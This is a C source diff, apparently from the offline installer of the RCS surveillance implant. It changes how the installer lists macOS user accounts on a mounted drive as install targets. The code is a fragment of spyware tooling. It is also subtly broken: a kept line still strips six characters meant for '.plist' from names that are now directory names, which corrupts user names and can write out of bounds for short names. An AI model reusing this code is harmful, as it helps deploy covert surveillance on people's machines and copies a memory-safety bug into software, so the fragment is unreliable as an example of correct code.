@@ -85,20 +85,20 @@ users_struct_t *MAC_GetUserList(os_struct_t *os_info, rcs_struct_t *rcs_info)
 
 	list_curr = &list_head;
 
-	_snwprintf_s(users_path, MAX_PATH, _TRUNCATE, L"%sprivate\\var\\db\\dslocal\\nodes\\Default\\users\\*", os_info->drive);
+	_snwprintf_s(users_path, MAX_PATH, _TRUNCATE, L"%sUsers\\*", os_info->drive);
 	hfind = FindFirstFile(users_path, &find_data);
 	if (hfind == INVALID_HANDLE_VALUE)
 		return NULL;
 
 	// Cicla tutti gli utenti
 	do {
-		if (find_data.cFileName[0] == L'_')
+		if (find_data.cFileName[0] == L'.' || !(find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) || !wcsicmp(find_data.cFileName, L"shared"))
 			continue;
 
-		_snwprintf_s(users_path, MAX_PATH, _TRUNCATE, L"%sprivate\\var\\db\\dslocal\\nodes\\Default\\users\\%s", os_info->drive, find_data.cFileName);
-		user_home = GetValueForKey(users_path, "home", 1);
+		user_home = (WCHAR *)calloc(MAX_PATH, sizeof(WCHAR));
 		if (!user_home)
 			continue;
+		_snwprintf_s(user_home, MAX_PATH, _TRUNCATE, L"/Users/%s", find_data.cFileName);
 
 		// Ora possiamo allocare la struttura perchè RCS è installabile
 		// su quest'utente
@@ -110,7 +110,7 @@ users_struct_t *MAC_GetUserList(os_struct_t *os_info, rcs_struct_t *rcs_info)
 		// Tronca il .plist alla fine del nome
 		find_data.cFileName[wcslen(find_data.cFileName)-6] = 0;
 		(*list_curr)->user_name = _wcsdup(find_data.cFileName);
-		(*list_curr)->full_name = GetValueForKey(users_path, "realname", 1);
+		(*list_curr)->full_name = _wcsdup(find_data.cFileName);
 		(*list_curr)->desc = NULL;
 		(*list_curr)->is_disabled = FALSE;
 		(*list_curr)->is_local = TRUE;
